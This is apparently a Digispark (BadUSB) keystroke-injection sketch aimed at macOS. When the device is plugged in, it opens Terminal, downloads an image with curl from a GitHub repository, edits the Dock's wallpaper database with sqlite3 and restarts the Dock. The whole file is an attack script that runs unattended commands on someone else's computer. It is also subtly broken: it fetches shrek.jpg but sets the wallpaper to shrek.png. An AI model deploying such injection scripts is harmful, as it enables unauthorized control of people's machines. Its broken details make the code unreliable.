#include "DigiKeyboard.h"

void setup() {
}

void loop() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("terminal");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("curl -O https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/shrek.jpg");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("sqlite3 /$HOME/Library/Application\\ Support/Dock/desktoppicture.db \"update data set value = '/Users/$USER/shrek.png'\" && killall Dock");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(200);
  for (;;) {} 
}
